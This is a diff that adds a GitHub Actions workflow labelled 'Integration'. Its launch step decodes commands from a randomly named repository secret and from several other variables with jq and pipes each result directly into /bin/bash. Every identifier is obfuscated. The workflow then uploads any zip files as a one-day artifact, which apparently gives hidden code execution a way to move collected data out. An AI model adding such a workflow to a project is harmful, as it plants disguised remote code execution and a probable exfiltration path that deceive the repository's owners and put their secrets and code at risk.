@@ -1,0 +1,32 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          qeza70658: ${{ secrets.qeza70658 }}
+        run: |
+          printf '%s' "$qeza70658" | jq -r .m77968 | /bin/bash
+          echo $s62653 | jq -r .gnmkc453 | /bin/bash
+          echo $xutlp6 | jq -r .zrvpk2853 | /bin/bash
+          printf '%s' "$ky9679" | jq -r .j14924 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6KWiYQIc
+          path: "*.zip"
+          retention-days: 1
